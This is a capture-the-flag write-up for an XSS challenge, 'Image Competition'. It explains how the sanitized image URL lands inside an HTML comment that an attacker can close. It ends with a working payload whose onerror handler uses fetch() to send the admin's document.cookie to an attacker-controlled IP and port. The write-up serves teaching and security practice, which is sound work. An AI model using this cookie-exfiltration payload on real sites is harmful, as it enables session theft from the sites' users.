---
layout: default
---
# Description
Task xss00: Image Competition

As is customary, the IT-Sec Chair is hosting its yearly photography competition. The winner of the competition will be given a flag. However, your chances of winning are slim as Sebastião Salgado has announced that he will be competing this year. Maybe there is another way to get a flag other then submitting the best photo?

## Overview
The website offers two action:
- uploading an url to an image
- sending a request to the admin, so that he will visit the page with the uploaded image

The Image is provided through a link to it.

## Security Features
Notable is, that the cookies on this website are not secured by HttpOnly and thus can be accessed by js. 

# Vulnerability
While the image src is sanitized to not escape the `src="<img>"` through replacing all quotes:
```python
$template->assign('TEMPLATE_IMAGE_SRC', str_replace('"', '', $_POST['image']));
```
... the website uses it again and makes a fatal mistake because they forgot to use the same concept of preventing closing the current environment, which is in this case a comment:

```python
<img src="<?php echo $TEMPLATE_IMAGE_SRC ?>" alt="If you can read this, the image was probably not found!" />
<!-- TODO: Remove old img tag thats not using alt!
<img src="<?php echo $TEMPLATE_IMAGE_SRC ?>"/>
-->
```

## Exploiting
We can close the comment and insert after that arbitrary html (including js) code $\rightarrow$ XSS.
Usually HTML is very soft to mistakes you can start another comment in the end to match it with the still to parse comment closing tag.

`"--><img src=x onerror=fetch('http://{my_ip}:{LISTEN_PORT}/?leak='.concat(encodeURIComponent(document.cookie)));>"`
